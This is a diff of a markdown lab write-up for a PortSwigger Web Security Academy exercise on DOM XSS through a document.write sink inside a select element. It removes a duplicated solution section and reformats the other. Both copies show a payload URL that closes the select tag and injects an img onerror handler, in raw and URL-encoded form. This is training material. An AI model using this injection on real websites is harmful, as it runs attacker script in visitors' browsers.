@@ -87,34 +87,6 @@ document.write('<option selected>'+store+'</option>');
 
 
 
-### Solution
-
-- Craft a payload that breaks out of the <select> context, Because <script> tags don’t execute reliably inside <select>, you must close the <select> first, then inject executable HTML.
-
-````
-https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=</select><img src=x onerror=alert(document.domain)>
-````
-
-<img width="1271" height="950" alt="image" src="https://github.com/user-attachments/assets/df16e337-a58a-496f-87e0-d4250f956f31" />
-
-
-- URL-encode
-
-````
-https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
-````
-
-<img width="1212" height="781" alt="image" src="https://github.com/user-attachments/assets/2b68072e-29f6-41ac-9495-97a3c4b351a0" />
-
-
-<img width="1077" height="821" alt="image" src="https://github.com/user-attachments/assets/ac2d4dbf-ff4f-4e4e-86d1-39ea745d07fe" />
-
-
-<img width="752" height="748" alt="image" src="https://github.com/user-attachments/assets/7712afe6-00d2-4fe2-98b2-bf9f95ab94be" />
-
-- Now we solved this lab.
-
-
 
 
 
@@ -122,18 +94,15 @@ https://0a77005504522dc3808803430096008e.web-security-academy.net/product?produc
 
 - Craft a payload that breaks out of the <select> context, Because <script> tags don’t execute reliably inside <select>, you must close the <select> first, then inject executable HTML:
 
-````
 https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=</select><img src=x onerror=alert(document.domain)>
-````
 
 <img width="1271" height="950" alt="image" src="https://github.com/user-attachments/assets/df16e337-a58a-496f-87e0-d4250f956f31" />
 
 
 - URL-encode
 
-````
 https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
-````
+
 
 <img width="1212" height="781" alt="image" src="https://github.com/user-attachments/assets/2b68072e-29f6-41ac-9495-97a3c4b351a0" />
 
